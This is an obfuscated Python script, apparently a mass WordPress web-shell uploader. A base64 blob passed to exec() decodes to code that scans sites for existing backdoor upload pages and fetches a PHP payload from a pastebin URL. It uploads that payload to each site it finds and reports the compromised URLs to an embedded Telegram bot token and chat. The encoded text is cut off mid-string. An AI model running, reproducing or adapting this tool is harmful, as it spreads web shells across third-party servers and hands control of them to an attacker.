
import base64
exec(base64.b64decode('I2Zyb20gZGlzdHV0aWxzLmNvbW1hbmQudXBsb2FkIGltcG9ydCB1cGxvYWQKZnJvbSB0YWJuYW5ueSBpbXBvcnQgY2hlY2sKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKZnJvbSByZSBpbXBvcnQgZmluZGFsbCBhcyByZWcKZnJvbSBtdWx0aXByb2Nlc3NpbmcuZHVtbXkgaW1wb3J0IFBvb2wKaW1wb3J0IHN0cmluZwpmcm9tIHJhbmRvbSBpbXBvcnQgY2hvaWNlLCByYW5kaW50CmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUKZnJvbSBjb2xvcmFtYSBpbXBvcnQgU3R5bGUKZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdAppbml0KGF1dG9yZXNldD1UcnVlKQpmciA9IEZvcmUuUkVECmdyID0gRm9yZS5CTFVFCmZjID0gRm9yZS5DWUFOCmZ3ID0gRm9yZS5XSElURQpmeSA9IEZvcmUuWUVMTE9XCmZnID0gRm9yZS5HUkVFTgpzZCA9IFN0eWxlLkRJTQpzbiA9IFN0eWxlLk5PUk1BTApzYiA9IFN0eWxlLkJSSUdIVApyZXF1ZXN0cy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKaGVhZGVycyA9IHsnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgICAgICAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAgICAgICAgICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemxpbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc4OTJBIEJ1bGlkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82MC4wLjMxMTIuMTA3IE1vYmxpZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgICAgICAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAgICAgICAgICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAgICAgICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJ30KCnRva2VuID0gIjU1NTcyNTk1MTA6QUFGLVdkeDVNbGhmSURzMEk0WWdvSjdfWnlhZXFuVmpsV1kiCmNoYXRpZCA9ICIxNDkwOTQ3NDUyIgoKZGVmIFNlbmRNc2cobXNnKToKICAgIHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCcrdG9rZW4rJy9zZW5kTWVzc2FnZT9jaGF0X2lkPScrY2hhdGlkKycmdGV4dD0nK21zZykKICAgIHJldHVybgoKZGVmIHVwbG9hZF91cGwoc2hlbGwpIDoKICAgIHRyeSA6CiAgICAgICAgX19faGZneXNhemVyX19fbmJ2eHdfX2tobGptID0gc3RyaW5nLmFzY2lpX3VwcGVyY2FzZQogICAgICAgIF9fX19fX3V5dGNoZGhqc3FtZCA9IHJhbmRpbnQoMyw1KQogICAgICAgIHJhbmRvbWluZyA9ICcnLmpvaW4oY2hvaWNlKF9fX2hmZ3lzYXplcl9fX25idnh3X19raGxqbSkgZm9yIGkgaW4gcmFuZ2UoX19fX19fdXl0Y2hkaGpzcW1kKSkKICAgICAgICBsaW5rX3VwbG9hZF9pc19oZXJlID0gJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9mZWhuaU1KWCcKICAgICAgICBjb2RlX3NvdXJjZSA9IHJlcXVlc3RzLmdldChsaW5rX3VwbG9hZF9pc19oZXJlLCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgdmFsdWVfX19fdHl0cnRhemV3cnNkeXRpeXBwbmcgPSAndXRjaGloYS0nK3JhbmRvbWluZysnLnBocCcKICAgICAgICBkYXRhX2MgPSB7J2ZpbGUnOih2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZyxjb2RlX3NvdXJjZSl9CiAgICAgICAgZGF0YV9nID0geydfdXBsJzogJ1VwbG9hZCd9CiAgICAgICAgcG9zdGluZ19hZ2FpbiA9IHJlcXVlc3RzLnBvc3Qoc2hlbGwsIHZlcmlmeT1GYWxzZSwgZmlsZXM9ZGF0YV9jLCBkYXRhPWRhdGFfZykKICAgICAgICBfX19fX3V0Y2hpaGEgID0gc2hlbGwucmVwbGFjZSgnZGIucGhwP3UnLCB2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZykKICAgICAgICBfX19zZ3Fid19fX19fX19fX19fX19fXyA9IHJlcXVlc3RzLmdldChfX19fX3V0Y2hpaGEsIHRpbWVvdXQ9MTApLnRleHQKICAgICAgICBpZiAnaW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCInIGluIF9fX3NncWJ3X19fX19fX19fX19fX19fIDoKICAgICAgICAgICAgcHJpbnQoZmcrJ0lzIHVwbG9hZGVkID09PT09PT0+PicrX19fX191dGNoaWhhKQogICAgICAgICAgICBvcGVuKCdzaGVsdXRjaGloYV9zYXZlZC50eHQnLCdhJykud3JpdGUoX19fX191dGNoaWhhKydcbicpCiAgICAgICAgICAgIFNlbmRNc2coX19fX191dGNoaWhhKQoKICAgICAgICBlbHNlIDoKICAgICAgICAgICAgcmVwbGljaW5nID0gX19fX191dGNoaWhhLnJlcGxhY2UoJ3RoZW1lcycsJ3RoZW1lJykKICAgICAgICAgICAgY2hlY2tpbmdtID0gcmVxdWVzdHMuZ2V0KHJlcGxpY2luZywgdGltZW91dD0xMCkKICAgICAgICAgICAgaWYgJ2lucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiJyBpbiBjaGVja2luZ20udGV4dCA6CiAgICAgICAgICAgICAgICBwcmludChmZysndXBsb2FkZWQgICA9PT09PT09PT09Pj4+PiAnK3JlcGxpY2luZykKICAgICAgICAgICAgICAgIG9wZW4oJ3NoZWx1dGNoaWhhX3NhdmVkLnR4dCcsJ2EnKS53cml0ZShyZXBsaWNpbmcrJ1xuJykKICAgICAgICAgICAgICAgIFNlbmRNc2cocmVwbGljaW5nKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoJ05vdCB1cGxvYWRlZHogICA9PT09Pj4+ICcrcmVwbGljaW5nKQogICAgZXhjZXB0IDoKICAgICAgICBwYXNzCiMgIyMjIyMjIyMjIyMjIyMKCmRlZiBleHBwKHNoZWxsKSA6CiAgICB0cnkgOgogICAgICAgIF9fX2hmZ3lzYXplcl9fX25idnh3X19raGxqbSA9IHN0cmluZy5hc2NpaV91cHBlcmNhc2UKICAgICAgICBfX19fX191eXRjaGRoanNxbWQgPSByYW5kaW50KDMsNSkKICAgICAgICByYW5kb21pbmcgPSAnJy5qb2luKGNob2ljZShfX19oZmd5c2F6ZXJfX19uYnZ4d19fa2hsam0pIGZvciBpIGluIHJhbmdlKF9fX19fX3V5dGNoZGhqc3FtZCkpCiAgICAgICAgbGlua191cGxvYWRfaXNfaGVyZSA9ICdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvZmVobmlNSlgnCiAgICAgICAgY29kZV9zb3VyY2UgPSByZXF1ZXN0cy5nZXQobGlua191cGxvYWRfaXNfaGVyZSwgdGltZW91dD0xMCkudGV4dAogICAgICAgIHZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nID0gJ3V0Y2hpaGEtJytyYW5kb21pbmcrJy5waHAnCiAgICAgICAgZGF0YV9jID0geydmaWxlJzoodmFsdWVfX19fdHl0cnRhemV3cnNkeXRpeXBwbmcsY29kZV9zb3VyY2UpfQogICAgICAgIGRhdGFfZyA9IHsnX3VwbCc6ICdVcGxvYWQnfQogICAgICAgIHBvc3RpbmdfYWdhaW4gPSByZXF1ZXN0cy5wb3N0KHNoZWxsLCB2ZXJpZnk9RmFsc2UsIGZpbGVzPWRhdGFfYywgZGF0YT1kYXRhX2cpCiAgICAgICAgX19fX191dGNoaWhhICA9IHNoZWxsLnJlcGxhY2UoJ2RiLnBocD91JywgdmFsdWVfX19fdHl0cnRhemV3cnNkeXRpeXBwbmcpCiAgICAgICAgX19fc2dxYndfX19fX19fX19fX19fX18gPSByZXF1ZXN0cy5nZXQoX19fX191dGNoaWhhLCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgaWYgJ2lucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiJyBpbiBfX19zZ3Fid19fX19fX19fX19fX19fXyA6CiAgICAgICAgICAgIHByaW50KGZnKydJcyB1cGxvYWRlZCA9PT09PT09Pj4nK19fX19fdXRjaGloYSkKICAgICAgICAgICAgb3Blbignc2hlbHV0Y2hpaGFfc2F2ZWQudHh0JywnYScpLndyaXRlKF9fX19fdXRjaGloYSsnXG4nKQogICAgICAgICAgICBTZW5kTXNnKF9fX19fdXRjaGloYSkKICAgICAgICBlbHNlIDoKICAgICAgICAgICAgcmVwcCA9IHNoZWxsLnJlcGxhY2UoJ2h0dHA6Ly8nLCAnaHR0cHM6Ly8nKQogICAgICAgICAgICBwb3N0aW5nX2FnYWluID0gcmVxdWVzdHMucG9zdChyZXBwLCB2ZXJpZnk9RmFsc2UsIGZpbGVzPWRhdGFfYywgZGF0YT1kYXRhX2cpCiAgICAgICAgICAgIHJwaW5nID0gcmVwcC5yZXBsYWNlKCdkYi5waHA/dScsIHZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nKQogICAgICAgICAgICBjaGVjaW5mZHMgID0gcmVxdWVzdHMuZ2V0KHJwaW5nLCB2ZXJpZnk9RmFsc2UsIHRpbWVvdXQ9MTApLnRleHQKICAgICAgICAgICAgaWYgJ2lucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiJyBpbiBjaGVjaW5mZHMgOgogICAgICAgICAgICAgICAgcHJpbnQoZmcrJ3VwbG9hZGVkID09PT09PT0+Pj4+PiAgJytzaGVsbCkKICAgICAgICAgICAgICAgIG9wZW4oJ3NoZWx1dGNoaWhhX3NhdmVkLnR4dCcsJ2EnKS53cml0ZShycGluZysnXG4nKQogICAgICAgICAgICAgICAgU2VuZE1zZyhycGluZykKICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICBwcmludCgnTm90IHVwbG9hZGVkeiAgID09PT0+Pj4gJytycGluZykKICAgIGV4Y2VwdCA6CiAgICAgICAgcGFzcwojIyMjIyMjIyMjIyMjIyMjIyMjCmxpbmtfdXBsb2FkX2lzX2hlcmUgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2ZlaG5pTUpYJwpkZWYgX19fX19fX19oZ2R5eXRxZmZzd3hjbm13bGtxcG9pdXl0eV9fX0hGR0tTSU9EQ0pBX19fS0pRSFNHREZSVEFSWkVXX19fX18oc2hlbGwpOgogICAgX19faGZneXNhemVyX19fbmJ2eHdfX2tobGptID0gc3RyaW5nLmFzY2lpX3VwcGVyY2FzZQogICAgX19fX19fdXl0Y2hkaGpzcW1kID0gcmFuZGludCgzLDUpCiAgICByYW5kb21pbmcgPSAnJy5qb2luKGNob2ljZShfX19oZmd5c2F6ZXJfX19uYnZ4d19fa2hsam0pIGZvciBpIGluIHJhbmdlKF9fX19fX3V5dGNoZGhqc3FtZCkpCiAgICBjb2RlX3NvdXJjZSA9IHJlcXVlc3RzLmdldChsaW5rX3VwbG9hZF9pc19oZXJlLCB0aW1lb3V0PTEwKS50ZXh0CiAgICB2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZyA9ICd1dGNoaWhhLScrcmFuZG9taW5nKycucGhwJwogICAgZGF0YV9hID0geydmJzoodmFsdWVfX19fdHl0cnRhemV3cnNkeXRpeXBwbmcsY29kZV9zb3VyY2UpfQogICAgZGF0YV9iID0geydmW10nOih2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZyxjb2RlX3NvdXJjZSl9CiAgICBkYXRhX2MgPSB7J2ZpbGUnOih2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZyxjb2RlX3NvdXJjZSl9CiAgICAjZGF0YV9hemVyZWF6dHkgPSB7J2YnOih2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZyxfaGhneXVkZF9pdW9wYWJid19fd3hjcWRzZWFydCl9CiAgICBkYXRhX2cgPSB7J191cGwnOiAnVXBsb2FkJ30KICAgIGZveF9hbm9uID0geydhJzogJ0JVYnd4Z2onLCdwMSc6ICd1cGxvYWRGaWxlJywnbmUnOiAnJywnY2hhcnNldCc6ICdVVEYtOCd9CiAgICBkYXRhX3d4Y3ZjY3d4diA9IHsnYSc6ICdGaWxlc01BbicsJ3AxJzogJ3VwbG9hZEZpbGUnLCdjaGFyc2V0JzogJ1dpbmRvd3MtMTI1MSd9CiAgICB0cnkgOgogICAgICAgIHN3Y3hjcWZhdHl5dXNwbmNqa2wgPSByZXF1ZXN0cy5nZXQoc2hlbGwsIHRpbWVvdXQ9MTApLnRleHQKICAgICAgICBpZiAnPDxzcGFuPlVwbG9hZCBmaWxlOicgaW4gc3djeGNxZmF0eXl1c3BuY2prbCBvciAndHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+JyBpbiBzd2N4Y3FmYXR5eXVzcG5jamtsIG9yICdidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWQiIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSBidG4tYmxvY2sgYmctdHJhbnNwYXJlbnQgbXQtMyIgaWQ9ImxvYWQiJyBpbiBzd2N4Y3FmYXR5eXVzcG5jamtsIG9yICc+RmlsZSBVcGxvYWQgOjwnIGluIHN3Y3hjcWZhdHl5dXNwbmNqa2wgOgogICAgICAgICAgICBwb3N0aW5nID0gcmVxdWVzdHMucG9zdChzaGVsbCwgZmlsZXM9ZGF0YV9jKQogICAgICAgICAgICBzcGxpdF9zaGVsbCA9IHNoZWxsLnNwbGl0KCcvJylbMl0KICAgICAgICAgICAgbWFrZV9zaGVsbCA9ICdodHRwOi8vJytzcGxpdF9zaGVsbCsnLycrdmFsdWVfX19fdHl0cnRhemV3cnNkeXRpeXBwbmcKICAgICAgICAgICAgY2hlY2tfcmVxdWVzdCA9IHJlcXVlc3RzLmdldChtYWtlX3NoZWxsLCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgICAgIGlmICdpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIicgaW4gY2hlY2tfcmVxdWVzdCA6CiAgICAgICAgICAgICAgICBwcmludCgndXBsb2FkZWQgPT0gICcrbWFrZV9zaGVsbCkKICAgICAgICAgICAgICAgIG9wZW4oJ3NoZWxscy50eHQnLCdhJykud3JpdGUobWFrZV9zaGVsbCsnXG4nKQogICAgICAgICAgICAgICAgU2VuZE1zZyhtYWtlX3NoZWxsKQogICAgICAgICAgICAgICAgI3d4Y2NxZ2d0dHF5dWFwcG9kb2RuYmJjYmJ3cV9fX19fU1FYV1NBUlpFUEpYTl9fX19fX21haWxlcnN1cGxvYWRmdW5jdGlvbl9fZ2ZxKG1ha2Vfc2hlbGwpCiAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgcG9zdGluZ19hZ2FpbiA9IHJlcXVlc3RzLnBvc3Qoc2hlbGwsIGZpbGVzPWRhdGFfYSwgZGF0YT1kYXRhX3d4Y3ZjY3d4dikKICAgICAgICAgICAgICAgIHNwX3NoZWxsID0gc2hlbGwuc3BsaXQoJy8nKVsyXQogICAgICAgICAgICAgICAgbWFrZV9zaGVsbHMgPSAnaHR0cDovLycrc3Bfc2hlbGwrJy8nK3ZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nCiAgICAgICAgICAgICAgICBjaGVja2luZyA9IHJlcXVlc3RzLmdldChtYWtlX3NoZWxscywgdGltZW91dD0xMCkudGV4dAogICAgICAgICAgICAgICAgaWYgJ2lucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiJyBpbiBjaGVja2luZyA6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ3VwbG9hZGVkICAgPT09ICAnK21ha2Vfc2hlbGxzKQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ3NoZWxscy50eHQnLCdhJykud3JpdGUobWFrZV9zaGVsbHMrJ1xuJykKICAgICAgICAgICAgICAgICAgICBTZW5kTXNnKG1ha2Vfc2hlbGxzKQogICAgICAgICAgICAgICAgICAgICN3eGNjcWdndHRxeXVhcHBvZG9kbmJiY2Jid3FfX19fX1NRWFdTQVJaRVBKWE5fX19fX19tYWlsZXJzdXBsb2FkZnVuY3Rpb25fX2dmcShtYWtlX3NoZWxscykKICAgICAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgICAgIF9fX19oZmd1c2R5c3QgPSByZXF1ZXN0cy5wb3N0KHNoZWxsLCBmaWxlcz1kYXRhX2IsIGRhdGE9Zm94X2Fub24sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICAgICAgc3BsX3V0Y2hpaGEgPSBzaGVsbC5zcGxpdCgnLycpWzJdCiAgICAgICAgICAgICAgICAgICAgbWt1ID0gJ2h0dHA6Ly8nK3NwbF91dGNoaWhhKycvJyt2YWx1ZV9fX190eXRydGF6ZXdyc2R5dGl5cHBuZwogICAgICAgICAgICAgICAgICAgIGNoZWNraW5nX3V0Y2hpaGEgPSByZXF1ZXN0cy5nZXQobWt1LCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgaWYgJ2lucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiJyBpbiBjaGVja2luZ191dGNoaWhhIDoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ3VwbG9hZGVkICA9PT0gJytta3UpCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ3NoZWxscy50eHQnLCdhJykud3JpdGUobWt1KydcbicpCiAgICAgICAgICAgICAgICAgICAgICAgIFNlbmRNc2cobWt1KQogICAgICAgICAgICAgICAgICAgICAgICAjd3hjY3FnZ3R0cXl1YXBwb2RvZG5iYmNiYndxX19fX19TUVhXU0FSWkVQSlhOX19fX19fbWFpbGVyc3VwbG9hZGZ1bmN0aW9uX19nZnEobWt1KQogICAgICAgICAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgICAgICAgICBfX3VkeXljaGh1ZGkgPSByZXF1ZXN0cy5wb3N0KHNoZWxsLCBmaWxlcz1kYXRhX2IsIGRhdGE9Zm94X2Fub24pCiAgICAgICAgICAgICAgICAgICAgICAgIHNwcCA9IHNoZWxsLnNwbGl0KCcvJylbMl0KICAgICAgICAgICAgICAgICAgICAgICAgbWFrZV9mb3hfdXRjaGloYSA9ICdodHRwOi8vJytzcHArJy8nK3ZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldChtYWtlX2ZveF91dGNoaWhhLCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICdpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIicgaW4gcmVxIDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCd1cGxvYWRlZCA9PSAnK21ha2VfZm94X3V0Y2hpaGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCdzaGVsbHMudHh0JywnYScpLndyaXRlKG1ha2VfZm94X3V0Y2hpaGErJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmRNc2cobWFrZV9mb3hfdXRjaGloYSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICN3eGNjcWdndHRxeXVhcHBvZG9kbmJiY2Jid3FfX19fX1NRWFdTQVJaRVBKWE5fX19fX19tYWlsZXJzdXBsb2FkZnVuY3Rpb25fX2dmcShtYWtlX2ZveF91dGNoaWhhKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGZyKydOb3QgdXBsb2FkZWQgPT0gJytzaGVsbCkKICAgICAgICBlbGlmICc8dGl0bGU+VnVsbiEhIHBhdGNoIGl0IE5vdyE8L3RpdGxlPicgaW4gc3djeGNxZmF0eXl1c3BuY2prbCA6CiAgICAgICAgICAgIGlmICdpbWFnZXMnIGluIHNoZWxsIDoKICAgICAgICAgICAgICAgIGdvICA9IHJlcXVlc3RzLnBvc3Qoc2hlbGwsIGZpbGVzPWRhdGFfYywgZGF0YT1kYXRhX2cpCiAgICAgICAgICAgICAgICBzcGxsID0gc2hlbGwuc3BsaXRlKCcvJylbMl0KICAgICAgICAgICAgICAgIGNoX3NwbGwgPSAnaHR0cDovLycrc3BsbCsnL2ltYWdlcy8nK3ZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nCiAgICAgICAgICAgICAgICBjaGVja19zaGVsbCA9IHJlcXVlc3RzLmdldChjaF9zcGxsLCB0aW1lb3V0PTEwKS50ZXh0CiAgICAgICAgICAgICAgICBpZiAnaW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCInIGluIGNoZWNrX3NoZWxsIDoKICAgICAgICAgICAgICAgICAgICBwcmludCgndXBsb2FkZWQgPSAgICcrY2hfc3BsbCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdzaGVsbHMudHh0JywnYScpLndyaXRlKGNoX3NwbGwrJ1xuJykKICAgICAgICAgICAgICAgICAgICBTZW5kTXNnKGNoX3NwbGwpCiAgICAgICAgICAgICAgICAgICAgI3d4Y2NxZ2d0dHF5dWFwcG9kb2RuYmJjYmJ3cV9fX19fU1FYV1NBUlpFUEpYTl9fX19fX21haWxlcnN1cGxvYWRmdW5jdGlvbl9fZ2ZxKGNoX3NwbGwpCiAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgb3BzZXMgPSByZXF1ZXN0cy5wb3N0KHNoZWxsLCBmaWxlcz1kYXRhX2MsIGRhdGE9ZGF0YV9nKQogICAgICAgICAgICAgICAgc2VsZl9zcGxpdCA9IHNoZWxsLnNwbGl0KCcvJylbMl0KICAgICAgICAgICAgICAgIG1ha2VyID0gJ2h0dHA6Ly8nK3NlbGZfc3BsaXQrJy8nK3ZhbHVlX19fX3R5dHJ0YXpld3JzZHl0aXlwcG5nCiAgICAgICAgICAgICAgICBfaGdnZnV0eV9faXUgPSByZXF1ZXN0cy5nZXQobWFrZXIsIHRpbWVvdXQ9MTApLnRleHQKICAgICAgICAgICAgICAgIGlmICdpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIicgaW4gX2hnZ2Z1dHlfX2l1IDoKICAgICAgICAgICAgICAgICAgICBwcmludCgndXBsb2FkZWQgID09ICcrbWFrZXIpCiAgICAgICAgICAgICAgICAgICAgb3Blbignc2hlbGxzLnR4dCcsJ2EnKS53cml0ZShtYWtlcisnXG4nKQogICAgICAgICAgICAgICAgICAgIFNlbmRNc2cobWFrZXIpCiAgICAgICAgICAgICAgICAgICAgI3d4Y2NxZ2d0dHF5dWFwcG9kb2RuYmJjYmJ3cV9fX19fU1FYV1NBUlpFUEpYTl9fX19fX21haWxlcnN1cGxvYWRmdW5jdGlvbl9fZ2ZxKG1ha2VyKQogICAgICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ05vdCB1cGxvYWRlZCAgICcrc2hlbGwpCiAgICBleGNlcHQgOgogICAgICAgIHBhc3MKCmRlZiBmaXJzdChpKSA6CiAgICAgICAgc2hlbGwgID0naHR0cDovLycraSsnL3dwLWNvbnRlbnQvdGhlbWVzL3Nlb3RoZW1lL2RiLnBocD91JwogICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldChzaGVsbCwgdGltZW91dD0xMCkKICAgICAgICBpZiAnbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj48aW5wdXQnIGluIHJlcS50ZXh0IDoKICAgICAgICAgICAgcHJpbnQoJ1tWdWxuX2NoZWNrXSA+Pj4+ICcraSkKICAgICAgICAgICAgdXBsb2FkX3VwbChzaGVsbCkKICAgICAgICBlbHNlIDoKICAgICAgICAgICAgc2hlbGwgPSAnaHR0cDovLycraSsnL3dwLWNvbnRlbnQvdGhlbWUvc2VvdGhlbWUvZGIucGhwP3UnCiAgICAgICAgICAgIHJlcXUgID0gcmVxdWVzdHMuZ2V0KHNoZWxsLCB2ZXJpZnk9RmFsc2UsIHRpbWVvdXQ9MTApCiAgICAgICAgICAgIGlmICdtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPjxpbnB1dCcgaW4gcmVxdS50ZXh0IDoKICAgICAgICAgICAgICAgIHByaW50KCdbVnVsbl9jaGVja10gPT09PT4+Pj4gJytpKQogICAgICAgICAgICAgICAgdXBsb2FkX3VwbChzaGVsbCkKICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICBwcmludChmcisnW05vdF92dWxuXSA9PT09PT09PT4+Pj4gICcraSkKCmRlZiBjaGVja2luZyhpKSA6CiAgICB0cnkgOgogICAgICAgIHNoZWxsID0gJ2h0dHA6Ly8nK2krJy93cC1jb250ZW50L2luZGV4LnBocD94PW9vbycKICAgICAgICBuZXdzID0gcmVxdWVzdHMuZ2V0KHNoZWxsLCB2ZXJpZnk9RmFsc2UsIGhlYWRlcnM9aGVhZGVycywgdGltZW91dD0yNSkKICAgICAgICBpZiAiPGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmaWxlJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+IiBpbiBuZXdzLnRleHQgOgogICAgICAgICAgICBwcmludCgnW2V4cGxvaXRlZF0gPT09PT0+Pj4+Pj4gICcraSkKICAgICAgICAgICAgb3Blbignc2hlbGxzLnR4dCcsJ2EnKS53cml0ZShzaGVsbCsnXG4nKQogICAgICAgICAgICBTZW5kTXNnKHNoZWxsKQogICAgICAgIGVsc2UgOgogICAgICAgICAgICBwcmludChmcisnW05vdF92dWxuXSAgID09PT09Pj4+ICcraSkKICAgIGV4Y2VwdCA6CiAgICAgICAgcGFzcwoKZGVmIG1hcihpKSA6CiAgICB0cnk6CiAgICAgICAgc2hlbGwgPSAnaHR0cDovLycraSsnL3dwLWNvbnRlbnQvcGx1Z2lucy9zZW9wbHVnaW5zL21hci5waHAnCiAgICAgICAgcHJ2ID0gcmVxdWVzdHMuZ2V0KHNoZWxsLCB0aW1lb3V0PTEwKQogICAgICAgIGlmICI+cHVibGljX2h0bWwiIGluIHBydi50ZXh0IG9yICI8c3Bhbj5VcGxvYWQgZmlsZToiIGluIHBydi50ZXh0IG9yICd0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj4nIGluIHBydi50ZXh0IG9yICdidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWQiIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSBidG4tYmxvY2sgYmctdHJhbnNwYXJlbnQgbXQtMyIgaWQ9ImxvYWQiJyBpbiBwcnYudGV4dCBvciAnPkZpbGUgVXBsb2FkIDo8JyBpbiBwcnYudGV4dCA6CiAgICAgICAgICAgIHByaW50KCdbY2hlY2tfdnVsbl0gICA9PT09Pj4+ICcraSkKICAgICAgICAgICAgb3Blbignc2hlbGxzLnR4dCcsJ2EnKS53cml0ZShzaGVsbCsnXG4nKQogICAgICAgICAgICBTZW5kTXNnKHNoZWxsKQogICAgICAgICAgICBfX19fX19fX2hnZHl5dHFmZnN3eGNubXdsa3Fwb2l1eXR5X19fSEZHS1NJT0RDSkFfX19LSlFIU0dERlJUQVJaRVdfX19fXyhzaGVsbCkKICAgICAgICBlbHNlIDoKICAgICAgICAgICAgcHJpbnQoZnIrJ1tOb3RfdnVsbl0g